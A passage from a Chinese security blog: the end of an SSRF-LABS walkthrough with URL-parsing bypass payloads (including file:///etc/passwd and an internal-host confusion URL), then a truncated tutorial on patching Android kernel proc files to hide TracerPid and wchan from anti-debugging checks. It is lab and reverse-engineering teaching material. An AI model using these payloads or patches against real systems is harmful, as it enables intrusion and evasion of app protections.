<p>原来<code>http://google.com# @secret.corp</code>中<code>@</code>后面的<code>secret.corp</code>是真正要访问的host，前面的<code>google.com#</code>绕过了urlparse的解析。感觉很神奇而且让人有点摸不着头脑，了解一下原理会好很多。SSRF漏洞产生的根本原因是url中有空格(<br>CRLF注入)，这让python中的两个模块解析url的时候起了冲突，urlparse认为host是google.com，而urllib则认为真正的host是secret.corp并且直接发出了请求。</p>
<p>为了进一步阐述上面漏洞利用的原理，用python写几行代码来验证一下，如果有点混乱，可以再看看上面的源代码，用urlparse解析URL进行判断是先于调用urllib发出请求的。下图为urlparse解析的结果，在python2.7和python3.5两个版本中都是一致的<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557887555/SSRF/1557887533_1.png" alt></p>
<p>为了能够进一步验证urllib能否正确接收到，在VPS上输入命令<code>nc -lvvv 9444</code>监听本地9444端口，再按照下面命令通过python发送请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python</span><br><span class="line">$ import urllib</span><br><span class="line">$ url = &quot;http://google.com# @[VPS的IP地址]:9444&quot;</span><br><span class="line">$ urllib.urlopen(url).read()</span><br></pre></td></tr></table></figure></p>
<p>之后在开启监听端口的服务器可以接收到如下的回显：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557990455/SSRF/08f2860301853756c50e4652d81b09c.png" alt></p>
<p>验证完毕。</p>
<h3 id="advanced3"><a href="#advanced3" class="headerlink" title="advanced3"></a>advanced3</h3><p>advanced3感觉作者代码不完整，感觉像在测试阶段，尝试过修改源代码，但是实际情况并不如我所想。所以这里就不丰富这部分内容了，如果之后作者对这部分题目有修改，我会对这部分内容进行补充。</p>
<h3 id="ctf-exp"><a href="#ctf-exp" class="headerlink" title="ctf exp"></a>ctf exp</h3><p>下面是ctf题目获取flag的方法，因为我我不是亚马逊的服务器，所以获取不了flag，如果想尝试的，可以看看<a href="https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a" target="_blank" rel="noopener">这篇文章</a></p>
<p>最后这个题目大家可以作为练习，到最后才看payload…..懒人就不重复说前面的内容了，来试试自己掌握了没有吧！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 http://secret1.corp</span><br><span class="line">2 file:///etc/passwd</span><br><span class="line">3 http://10.38 #a000026、167772198</span><br><span class="line">4 http://google.com# @secret3.corp</span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://Se8S0n.github.io.git/2019/05/19/SSRF-LABS指南/" data-id="ckrzo1bj7000adfrtix7q59vl" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android安全-翻译/">Android安全 翻译</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-尝试绕过TracePID反调试二——从源码入手" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/04/19/尝试绕过TracePID反调试二——从源码入手/" class="article-date">
  <time datetime="2019-04-19T17:43:49.000Z" itemprop="datePublished">2019-04-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/04/19/尝试绕过TracePID反调试二——从源码入手/">尝试绕过TracePID反调试——从源码入手</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="绕过TracePid反调试二"><a href="#绕过TracePid反调试二" class="headerlink" title="绕过TracePid反调试二"></a>绕过TracePid反调试二</h1><p>第一篇文章是直接修改二进制文件<a href="https://www.52pojie.cn/thread-917096-1-1.html" target="_blank" rel="noopener">尝试绕过TracerPID反调试</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接受了评论的建议, 但是因为之前手机还没好加上没试过直接修改kernel的源码, 所以花了很多时间(都是环境惹的祸)。还有因为这个接触了shell code, 真的是一言难尽。事先说明, 下面的环境准备都是在国外的服务器上直接运行的, 难免有一些命令是需要翻墙的, 所以你实际上要用的命令可能跟我的有点不同(如果可以直接用代理之类的, 应该没多大影响)。</p>
<h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>Ubuntu 18.10(建议用Ubuntu 16.04, 至少2MB内存)<br>Android 6.0.1<br>Nexus 5</p>
<h2 id="Ubuntu环境搭建"><a href="#Ubuntu环境搭建" class="headerlink" title="Ubuntu环境搭建"></a>Ubuntu环境搭建</h2><h3 id="Java环境准备"><a href="#Java环境准备" class="headerlink" title="Java环境准备"></a>Java环境准备</h3><p>下文Java环境搭建都是基于Ubuntu 18.10的, 如果你尝试过不能在自己的Ubuntu环境下使用, 可以到google上找找看, 应该能找到你想要的。如果不是为了之后Android源码调试, 只是为了修改kernel文件可以先不搭建Java环境。</p>
<h4 id="下载JDK"><a href="#下载JDK" class="headerlink" title="下载JDK"></a>下载JDK</h4><ol>
<li>为了下载最新的JDK, 可以现在Ubuntu的命令行里面先输入<code>javac</code>, 会显示下面的内容, 按照它提供的命令即可下载最新的JDK。<br> <img src="https://i.imgur.com/hDyztXW.png" alt></li>
<li>很不快乐的是Java 6和Java 7需要有Oracle的账号, 所以只要去Orcle注册一个账号, 就可以下载<a href="https://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html" target="_blank" rel="noopener">Java 7</a>和<a href="https://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase6-419409.html" target="_blank" rel="noopener">Java 6</a>了(Java 7是压缩包, Java 6是一个二进制文件)。<strong>文章末尾附有两个jdk文件的链接</strong>。<h4 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h4>因为先安装了Java 8在路径<code>/usr/lib/jvm</code>目录下, 所以将文件文件<code>jdk-6u45-linux-x64.bin</code>和<code>jdk-7u80-linux-x64.tar.gz</code>都用mv命令移到上述目录下。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:~/[jdk 6存放的位置]# mv jdk-6u45-linux-x64.bin /usr/lib/jvm/</span><br><span class="line">root@vultr:~/[jdk 7存放的位置]# mv jdk-7u80-linux-x64.tar.gz /usr/lib/jvm/</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>解压jdk 6, 进入到<code>/usr/lib/jvm</code>目录下, 先给该文件读写的权限, 之后运行该二进制文件就会在当前目录下生成一个新的文件夹。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:~/[jdk 7存放的位置]# cd /usr/lib/jvm</span><br><span class="line">root@vultr:/usr/lib/jvm# chmod +x jdk-6u45-linux-x64.bin</span><br><span class="line">root@vultr:/usr/lib/jvm# ./jdk-6u45-linux-x64.bin</span><br></pre></td></tr></table></figure></p>
<p>解压jdk 7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:/usr/lib/jvm# tar -zxvf jdk-7u80-linux-x64.tar.gz</span><br></pre></td></tr></table></figure></p>
<p>为了我们能够在Ubuntu里面自由自在地切换Java版本, 我们可以先写个脚本将jdk-6和jdk-7添加到候选项中。先输入命令<code>vim alternativeJava.sh</code>, 并将下面的内容直接复制到alternativsjava.sh文件里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">JAVAHOME=$1 </span><br><span class="line">if [ -d $JAVAHOME ];then</span><br><span class="line">        sudo update-alternatives --install /usr/bin/java java $JAVAHOME/bin/java 300</span><br><span class="line">        sudo update-alternatives --install /usr/bin/javac javac $JAVAHOME/bin/javac 300</span><br><span class="line">        sudo update-alternatives --install /usr/bin/jar jar $JAVAHOME/bin/jar 300</span><br><span class="line">        sudo update-alternatives --install /usr/bin/javah javah $JAVAHOME/bin/javah 300</span><br><span class="line">        sudo update-alternatives --install /usr/bin/javap javap $JAVAHOME/bin/javap 300</span><br><span class="line">else</span><br><span class="line">        echo &quot;Wrong input&quot;</span><br><span class="line">        exit 0</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p>
<p>用命令<code>chmod+x 
alternativsjava.sh</code>, 给脚本添加权限, 否则脚本会不能运行。输入命令<code>./alternativsjava.sh /usr/lib/jvm/jdk1.7.0_80</code>之后(脚本后面添加的路径是你jdk解压后的文件路径),用<code>sudo update-alternatives --config java</code>(切换java版本命令)进行检验。<br><img src="https://i.imgur.com/WgvHJPd.png" alt></p>
<h3 id="准备Android源码运行环境"><a href="#准备Android源码运行环境" class="headerlink" title="准备Android源码运行环境"></a>准备Android源码运行环境</h3><p>以下内容仅编译内核, 并假设你还没有下载整个 AOSP源。因为我要编译的内核版本过旧, 所以用的都是旧的教程, 如果有要编译新的内核的要求的话, 可以看看这两篇文章, <a href="https://github.com/nathanchance/android-kernel-clang#how-to-compile-the-kernel-with-clang-standalone" target="_blank" rel="noopener">Compiling an Android kernel with Clang</a>和<a href="https://source.android.google.cn/setup/build/building-kernels" target="_blank" rel="noopener">编译内核</a>。</p>
<h4 id="安装所需的软件包"><a href="#安装所需的软件包" class="headerlink" title="安装所需的软件包"></a>安装所需的软件包</h4><p>在Ubuntu 14.04中如果下载git出问题, 可以看看这篇文章<a href="https://www.digitalocean.com/community/tutorials/how-to-install-git-on-ubuntu-14-04" target="_blank" rel="noopener">How To Install Git on Ubuntu 14.04</a>。</p>
<p>输入下述命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git-core gnupg flex bison gperf build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev libgl1-mesa-dev libxml2-utils xsltproc unzip</span><br></pre></td></tr></table></figure></p>
<h4 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h4><p>在下载之前先获取手机的内核版本, 从下面的信息可知道手机内核的<code>git short commit id</code>为<code>cf10b7e</code>。<br><img src="https://i.imgur.com/r0l0Gz2.png" alt></p>
<p>因为内核版本比较旧, 所以按照<a href="https://source.android.com/setup/build/building-kernels-deprecated" target="_blank" rel="noopener">旧版的官方内核</a>编译手册来, 而不是按照<a href="https://source.android.com/setup/build/building-kernels" target="_blank" rel="noopener">新版的内核编译手册</a>来。如果内核比较新的, 还是直接用repo吧！接下来可以从官方手册上看到, 我需要的kernel源代码位于哪个branch, 然后从github上clone下来。<br><img src="https://i.imgur.com/qZ8Dllc.png" alt></p>
<p>输入命令, 先将msm这个项目clone下来。(这一步花的时间可能会有一点点长)<br><code>$ git clone https://android.googlesource.com/kernel/msm.git</code></p>
<p>因为我用的是国外的服务器, 所以可以直接从google服务器下下来。如果是自己搭建的机器且觉得开代理太麻烦的话, 可以换成下面的命令。<br><code>$ git clone https://aosp.tuna.tsinghua.edu.cn/kernel/msm.git</code></p>
<p>将msm从github上clone下来之后, 会发现里面是个空的, 只有一个<code>.git</code>仓库。进入<code>msm</code>目录下, 用<code>git branch -a</code>查看分支。(我的文件路径跟图片下的不符, 实际上应该是<code>/AndroidKernel/msm</code>)<br><img src="https://i.imgur.com/czFhbta.png" alt></p>
<p>现在就要用到我们之前获取的short commit id(显示的是实际的commit id的前7位)了, 直接检出我们需要的代码的分支。<br><code>git branch -r --contains &lt;your short commit id&gt;</code></p>
<p>从上面的图片我们可以知道, 本地实际上只有<code>master</code>这一个分支, 这时候我们需要做的事就是在远程分支的基础上再分一个本地分支。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b android-msm-hammerhead-3.4-marshmallow-mr3 origin/android-msm-hammerhead-3.4-marshmallow-mr3</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.imgur.com/3J4jtIc.png" alt></p>
<h4 id="安装GCC交叉编译器"><a href="#安装GCC交叉编译器" class="headerlink" title="安装GCC交叉编译器"></a>安装GCC交叉编译器</h4><p>之前不是很能理解为什么官方网站没说要下载这个东西, 之后在<a href="https://appuals.com/how-to-build-a-custom-android-kernel/" target="_blank" rel="noopener">How to Build a Custom Android Kernel</a>这篇文章里面看到。因为一般我们需要编译的kernel源代码都是基于arm架构编译运行的, 所以直接放在我们64位的Ubuntu里面是不合适的。也可以跟官方一样直接通过USB连接手机直接进行调试。</p>
<p>在<code>~/AndroidKernel</code>执行如下命令(下载现在Linux环境下的arm编译接口)。这个编译接口尽量别尝试arm-eabi-4.8以上的, 因为旧的内核和交叉编译器不匹配会出现很多麻烦, 例如现在Google已经弃用了gcc, 在最新的交叉编译器里面只能用clang, 即使<code>make</code>操作加了参数<code>CC=clang</code>也会在出现很多很麻烦的报错。所以我这里为了匹配, 用的是旧的交叉编译器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6</span><br></pre></td></tr></table></figure></p>
<p>在这里尝试了一下清华的AOSP源, 也是可以直接用的。参考贴出来的google的url, 直接将里面的<code>https://android.googlesource.com/</code>全部改成<code>https://aosp.tuna.tsinghua.edu.cn/</code>即可。详情可参考<a href="https://mirror.tuna.tsinghua.edu.cn/help/AOSP/" target="_blank" rel="noopener">Android 镜像使用帮助</a>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://aosp.tuna.tsinghua.edu.cn/platform/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6</span><br></pre></td></tr></table></figure></p>
<h4 id="添加环境变量"><a href="#添加环境变量" class="headerlink" title="添加环境变量"></a>添加环境变量</h4><p>添加环境变量总共有两种方法, 一种是短期的, 开机重启之后就会失效, 一种是长期的。</p>
<p>第一种：在<code>~/AndroidKernel</code>目录下执行以下命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ export PATH=~/AndroidKernel/arm-eabi-4.6/bin:$PATH</span><br></pre></td></tr></table></figure></p>
<p>第二种：在<code>~/.bashrc</code>中添加环境变量<br><code>$ vim ~/.bashrc</code></p>
<p>之后在文件末尾添加<code>export PATH=&lt;交叉编译API存放的文件根目录&gt;/arm-linux-androideabi-4.9/bin:$PATH</code></p>
<p>为了让这个配置立马生效, 我们可以用下面的命令<br><code>$ source ~/.bashrc</code></p>
<h2 id="修改源码"><a href="#修改源码" class="headerlink" title="修改源码"></a>修改源码</h2><h3 id="修改前准备-修改源码"><a href="#修改前准备-修改源码" class="headerlink" title="修改前准备+修改源码"></a>修改前准备+修改源码</h3><p>如果觉得不想知道为什么要修改<code>base.c</code>和<code>array.c</code>文件, 可以跳过现在这一段, 直接从下一段“修改<code>msm/fs/proc/base.c</code>文件”开始看就好了。</p>
<p>我将<code>msm/fs/proc</code>目录下的文件都下载到本地(都是先修改完成的), 安装了<a href="https://bbs.pediy.com/thread-215669.htm" target="_blank" rel="noopener">Source Insight</a>来分析源码。<a href="http://man7.org/linux/man-pages/man5/proc.5.html" target="_blank" rel="noopener">proc文件</a>, 是以文件系统的方式为访问系统内核的操作提供接口, 动态从系统内核中读出所需信息的。这也就说明, 我们想要修改的TracePid也是通过这个文件中获取到的。</p>
<p>我们想获取进程信息的时候, 一般会输出下述内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&gt;cat /proc/self/status</span><br><span class="line"> Name:   cat</span><br><span class="line"> State:  R (running)</span><br><span class="line"> Tgid:   5452</span><br><span class="line"> Pid:    5452</span><br><span class="line"> PPid:   743</span><br><span class="line"> TracerPid:      0                     (2.4)</span><br><span class="line"> Uid:    501     501     501     501</span><br><span class="line"> Gid:    100     100     100     100</span><br><span class="line"> FDSize: 256</span><br><span class="line"> Groups: 100 14 16</span><br><span class="line"> VmPeak:     5004 kB</span><br><span class="line"> VmSize:     5004 kB</span><br><span class="line"> VmLck:         0 kB</span><br><span class="line"> VmHWM:       476 kB</span><br><span class="line"> VmRSS:       476 kB</span><br><span class="line"> VmData:      156 kB</span><br><span class="line"> VmStk:        88 kB</span><br><span class="line"> VmExe:        68 kB</span><br><span class="line"> VmLib:      1412 kB</span><br><span class="line"> VmPTE:        20 kb</span><br><span class="line"> VmSwap:        0 kB</span><br><span class="line"> Threads:        1</span><br><span class="line"> SigQ:   0/28578</span><br><span class="line"> SigPnd: 0000000000000000</span><br><span class="line"> ShdPnd: 0000000000000000</span><br><span class="line"> SigBlk: 0000000000000000</span><br><span class="line"> SigIgn: 0000000000000000</span><br><span class="line"> SigCgt: 0000000000000000</span><br><span class="line"> CapInh: 00000000fffffeff</span><br><span class="line"> CapPrm: 0000000000000000</span><br><span class="line"> CapEff: 0000000000000000</span><br><span class="line"> CapBnd: ffffffffffffffff</span><br><span class="line"> Seccomp:        0</span><br><span class="line"> voluntary_ctxt_switches:        0</span><br><span class="line"> nonvoluntary_ctxt_switches:     1</span><br></pre></td></tr></table></figure></p>
<p>在上述Status信息中我们需要关注的两个部分, 一个是<code>State</code>字段, 一个是<code>TracePid</code>字段。因为这两个字段都可反映出进程是否被监测。详情可参考<a href="https://android.googlesource.com/kernel/msm/+/android-wear-5.1.1_r0.6/Documentation/filesystems/proc.txt?autodive=0%2F%2F%2F" target="_blank" rel="noopener"> proc.txt </a>的<code>line 209</code>和<code>line 215</code>。</p>
<p>在<a href="http://man7.org/linux/man-pages/man5/proc.5.html" target="_blank" rel="noopener">proc手册</a>查找<code>/proc/[pid]/stat</code>, 我们可以知道Status是在<code>fs/proc/array.c</code>定义的, 我们就先从<code>array.c</code>入手。</p>
<p>先打开查看调用关系的窗口, <code>View-&gt;Panels-&gt;Relation Windows</code>。</p>
<p>在<code>array.c</code>文件中搜索<code>status</code>, 找到函数<code>proc_pid_status</code>, 之后查看该函数调用与被调用的信息。<br><img src="https://i.imgur.com/jyMavtL.png" alt></p>
<p>在<code>Relation Window</code>中双击<code>get_task_state</code>函数, 就找到了我们想找的<code>TracePid</code>。这个就是我们要修改的第一处了。<br><img src="https://i.imgur.com/rMp60mL.png" alt></p>
<p>TracePid 通常都是对父进程 pid 进行检测, 这里将 ppid 改为 0, 这样不管是否为调试状态, TracePid 都无法检测出。修改的结果如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">180 seq_printf(m,</span><br><span class="line">181            &quot;State:\t%s\n&quot;</span><br><span class="line">182            &quot;Tgid:\t%d\n&quot;</span><br><span class="line">183            &quot;Pid:\t%d\n&quot;</span><br><span class="line">184            &quot;PPid:\t%d\n&quot;</span><br><span class="line">185            &quot;TracerPid:\t%d\n&quot;</span><br><span class="line">186            &quot;Uid:\t%d\t%d\t%d\t%d\n&quot;</span><br><span class="line">187            &quot;Gid:\t%d\t%d\t%d\t%d\n&quot;,</span><br><span class="line">188            get_task_state(p),</span><br><span class="line">189            task_tgid_nr_ns(p, ns),</span><br><span class="line">190            pid_nr_ns(pid, ns),</span><br><span class="line">               //修改部分</span><br><span class="line">191            ppid, 0,</span><br><span class="line">               //修改结束</span><br><span class="line">192            cred-&gt;uid, cred-&gt;euid, cred-&gt;suid, cred-&gt;fsuid,</span><br><span class="line">193            cred-&gt;gid, cred-&gt;egid, cred-&gt;sgid, cred-&gt;fsgid);</span><br></pre></td></tr></table></figure></p>
<p>上面的代码段中的<code>get_task_state()</code>函数引起了我的注意, 这个函数应该是获取state的函数。用鼠标选中该函数之后, 右手边的<code>Relation Window</code>会显示该函数所在的位置, 在该窗口双击之后跳转。<br><img src="https://i.imgur.com/MAbWXuR.png" alt></p>
<p>在上图中, 看到了明显用来存放状态的数组<code>task_state_array</code>, 选中该数组之后, 同样的在<code>Relation Window</code>中双击跳转。<br><img src="https://i.imgur.com/O70xlsH.png" alt></p>
<p>将原来状态表中的<code>T</code>和<code>t</code>都修改为<code>S</code>这样就避免了该状态位反映出被监测的状态。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">R  Running</span><br><span class="line">S  Sleeping in an interruptible wait</span><br><span class="line">D  Waiting in uninterruptible disk sleep</span><br><span class="line">Z  Zombie</span><br><span class="line">T  Stopped (on a signal) or (before Linux 2.6.33)</span><br><span class="line">   trace stopped</span><br><span class="line">t  Tracing stop (Linux 2.6.33 onward)</span><br><span class="line">W  Paging (only before Linux 2.6.0)</span><br><span class="line">X  Dead (from Linux 2.6.0 onward</span><br><span class="line">x  Dead (Linux 2.6.33 to 3.13 only)</span><br><span class="line">K  Wakekill (Linux 2.6.33 to 3.13 only)</span><br><span class="line">W  Waking (Linux 2.6.33 to 3.13 only)</span><br><span class="line">P  Parked (Linux 3.9 to 3.13 only)</span><br></pre></td></tr></table></figure></p>
<p><code>array.c</code>我们已经修改完毕了, 这时候我们就要修改其他部分了。在<a href="https://blog.csdn.net/MyLinChi/article/details/78459373" target="_blank" rel="noopener">导入Project</a>之后, 我们在整个proc文件中搜索关键词<code>trace</code>。先按照下图打开<code>Project Search Bar</code>, 并在其中输入<code>trace</code>。<br><img src="https://i.imgur.com/AF3qdP7.png" alt></p>
<p>我们会发现搜索的结果都是在<code>base.c</code>文件中(下图出现的第一个包含<code>trace</code>关键词的函数是我已经修改过的)。<br><img src="https://i.imgur.com/qdR3XWj.png" alt></p>
<p>在检查完有<code>trace</code>关键词的代码没发现有用的, 就在<code>base.c</code>文件中搜索关键词<code>status</code>。</p>
<p><code>Ctrl+F</code>输入关键词之后没找到, 就通过下图的向下搜索的功能一个个定位, 前面的部分都没找到自己想要找的函数段。<br><img src="https://i.imgur.com/XOlk7fq.png" alt></p>
<p>直到找到了关键的部分, 选中函数<code>proc_pid_status</code>, 在右边<code>Relation Window</code>中继续找我们想要的关键函数。<br><img src="https://i.imgur.com/VV1xxyc.png" alt></p>
<p>但是很遗憾, 在<code>proc_pid_status</code>函数中跟了很多相关的函数仍然没找到我们想要的。那我们就回到我们最开始的地方。这部分最上面的标识是<code>pid_entry</code>。顺着这个部分往下看, 我们就找到了<code>proc_tid_stat</code>函数, 选中该函数之后我们可以找到<code>do_task_stat</code>函数。<br><img src="https://i.imgur.com/akjELQ8.png" alt></p>
<p>接下来, 我们就好好看看这个函数里面有什么。在右边的<code>Relation Window</code>中关注到一个有<code>state</code>关键词的函数, 双击之后跳转到该函数调用的位置。<br><img src="https://i.imgur.com/Z6XIxPk.png" alt></p>
<p>定位到上图那一行之后, 分别跟了<code>state</code>关键词和<code>get_task_state</code>函数, 都没有发现什么(<code>base.c</code>是进程运行之前要做的准备工作, 从<code>get_task_state</code>函数可直接回到之前修改的<code>array.c</code>文件。但因为已修改完成, 所以就留在<code>base.c</code>文件中没有继续定位了)。</p>
<p>现在看到这段函数之中大部分都用到了变量<code>task</code>, 所以只好将<code>task</code>作为关键词用笨办法来一个一个定位。最后找到了<code>wchan</code>, 真的眼泪都掉下来。(因为事先知道要改这个部分)</p>
<p>看了<a href="https://gtoad.github.io/2017/06/25/Android-Anti-Debug/" target="_blank" rel="noopener">Android反调试技术整理与实践</a>这篇文章才知道为什么要修改带有<code>wchan</code>关键词的函数。因为<code>/proc/pid/wchan</code> 和 <code>/proc/pid/task/pid/wchan</code>在调试状态下，里面内容为<code>ptrace_stop</code>, 非调试的状态下为ep_poll。所以也可能会泄露正在被调试的信息, 所以我们直接在Project中查找<code>wchan</code>关键词, 就定位到函数<code>proc_pid_wchan</code><br><img src="https://i.imgur.com/naZExKg.png" alt></p>
<p>定位结束之后我们进行如下修改, 到这里我们的修改就彻底结束了。<br><img src="https://i.imgur.com/dU8GVIZ.png" alt></p>
<h3 id="修改msm-fs-proc-base-c文件"><a href="#修改msm-fs-proc-base-c文件" class="headerlink" title="修改msm/fs/proc/base.c文件"></a>修改<code>msm/fs/proc/base.c</code>文件</h3><p>在Ubuntu中编辑文件<code>vim msm/fs/proc/base.c</code>, 定位函数<code>proc_pid_wchan</code>(大概在268行左右)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">267 static int proc_pid_wchan(struct task_struct *task, char *buffer)</span><br><span class="line">268 &#123;</span><br><span class="line">269        unsigned long wchan;</span><br><span class="line">270        char symname[KSYM_NAME_LEN];</span><br><span class="line">271</span><br><span class="line">272        wchan = get_wchan(task);</span><br><span class="line">273</span><br><span class="line">274        if (lookup_symbol_name(wchan, symname) &lt; 0)</span><br><span class="line">275                if (!ptrace_may_access(task, PTRACE_MODE_READ))</span><br><span class="line">276                        return 0;</span><br><span class="line">277                else</span><br><span class="line">278                        return sprintf(buffer, &quot;%lu&quot;, wchan);</span><br><span class="line">279        else</span><br><span class="line">280                return sprintf(buffer, &quot;%s&quot;, symname);</span><br><span class="line">281 &#125;</span><br></pre></td></tr></table></figure></p>
<p>改成下面的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">static int proc_pid_wchan(struct task_struct *task, char *buffer)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned long wchan;</span><br><span class="line">    char symname[KSYM_NAME_LEN];</span><br><span class="line"></span><br><span class="line">    wchan = get_wchan(task);</span><br><span class="line"></span><br><span class="line">    if (lookup_symbol_name(wchan, symname) &lt; 0)</span><br><span class="line">        if (!ptrace_may_access(task, PTRACE_MODE_READ))</span><br><span class="line">            return 0;</span><br><span class="line">        else</span><br><span class="line">            return sprintf(buffer, &quot;%lu&quot;, wchan);</span><br><span class="line">    else</span><br><span class="line">    &#123;   // 更改的内容</span><br><span class="line">        if(strstr(symname,&quot;trace&quot;))</span><br><span class="line">            return sprintf(buffer, &quot;%s&quot;, &quot;sys_epoll_wait&quot;);</span><br><span class="line">        return sprintf(buffer, &quot;%s&quot;, symname);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="修改msm-fs-proc-array-c文件"><a href="#修改msm-fs-proc-array-c文件" class="headerlink" title="修改msm/fs/proc/array.c文件"></a>修改<code>msm/fs/proc/array.c</code>文件</h3><p>用vim对<code>msm/fs/proc/array.c</code>进行编辑, 先修改第一处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">134 static const char * const task_state_array[] 135 = &#123;</span><br><span class="line">136        &quot;R (running)&quot;,          /*   0 */</span><br><span class="line">137        &quot;S (sleeping)&quot;,         /*   1 */</span><br><span class="line">138        &quot;D (disk sleep)&quot;,       /*   2 */</span><br><span class="line">139        &quot;T (stopped)&quot;,          /*   4 */</span><br><span 